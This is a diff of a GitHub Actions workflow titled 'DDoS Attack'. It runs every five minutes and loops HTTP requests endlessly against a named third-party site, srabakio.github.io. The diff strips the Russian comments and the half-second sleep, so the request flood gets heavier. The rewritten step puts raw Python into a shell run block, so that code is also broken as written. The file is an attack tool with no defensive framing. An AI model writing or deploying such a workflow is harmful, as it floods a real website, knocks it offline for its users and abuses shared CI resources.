@@ -1,11 +1,8 @@
 name: DDoS Attack
 
 on:
-  # Запускать каждые 5 минут
   schedule:
     - cron: '*/5 * * * *'
-  # Или запускать вручную (Uncomment строку ниже, если хочешь запускать кнопкой)
-  # workflow_dispatch:
 
 jobs:
   attack:
@@ -20,19 +17,13 @@ jobs:
           python-version: '3.x'
       
       - name: Install dependencies
+        run: pip install requests
+      
+      - name: Run Attack
         run: |
-          pip install requests
-          
-      - name: Run Attack Script
-        run: |
-          echo "Starting attack on srabakio.github.io"
-          python -c "
-import requests
-import time
-while True:
-    try:
-        requests.get('https://srabakio.github.io/')
-    except:
-        pass
-    time.sleep(0.5)
-  "
+          import requests
+          while True:
+              try:
+                  requests.get('https://srabakio.github.io/')
+              except:
+                  pass
